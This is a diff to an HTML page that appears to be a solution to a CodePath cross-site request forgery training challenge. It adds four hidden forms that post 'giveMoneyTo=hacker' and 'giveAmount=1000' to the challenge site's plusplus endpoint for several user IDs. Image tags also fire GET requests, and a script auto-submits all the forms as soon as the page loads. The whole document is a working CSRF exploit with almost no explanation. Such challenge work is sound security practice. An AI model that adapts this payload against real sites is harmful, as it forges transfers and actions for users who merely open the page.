@@ -12,13 +12,32 @@
     <img src="https://security.codepath.com/user/csrfchallengetwo/plusplus?userId=515a308a8b334b3b046ad0f5777ee73ef98a2ef0" />
     <img src="https://security.codepath.com/user/csrfchallengetwo/plusplus?userId=4e328d8f571a27eb71b144f5e2738fffa9145593" /> 
 
-    <form name="csrfForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus?userId=7fcf0f4405819f2b7447058d81f530a4ce7c25e5" method="POST">
+    <form name="csrfForm1" action="https://security.codepath.com/user/csrfchallengetwo/plusplus?userId=7fcf0f4405819f2b7447058d81f530a4ce7c25e5" method="POST">
         <input type="hidden" name="giveMoneyTo" value="hacker" />
         <input type="hidden" name="giveAmount" value="1000" />
         <input type="submit"/>
     </form>
+    <form name="csrfForm2" action="https://security.codepath.com/user/csrfchallengetwo/plusplus?userId=2bc6c11c83668c3d18b89d438e124e1db1b0067a" method="POST">
+        <input type="hidden" name="giveMoneyTo" value="hacker" />
+        <input type="hidden" name="giveAmount" value="1000" />
+        <input type="submit"/>
+    </form>
+    <form name="csrfForm3" action="https://security.codepath.com/user/csrfchallengetwo/plusplus?userId=515a308a8b334b3b046ad0f5777ee73ef98a2ef0" method="POST">
+        <input type="hidden" name="giveMoneyTo" value="hacker" />
+        <input type="hidden" name="giveAmount" value="1000" />
+        <input type="submit"/>
+    </form>
+    <form name="csrfForm4" action="https://security.codepath.com/user/csrfchallengetwo/plusplus?userId=4e328d8f571a27eb71b144f5e2738fffa9145593" method="POST">
+        <input type="hidden" name="giveMoneyTo" value="hacker" />
+        <input type="hidden" name="giveAmount" value="1000" />
+        <input type="submit"/>
+    </form>
+    
     <script>
-    document.csrfForm.submit();
+    document.csrfForm1.submit();
+    document.csrfForm2.submit();
+    document.csrfForm3.submit();
+    document.csrfForm4.submit();
     </script>
 </body>
 </html>
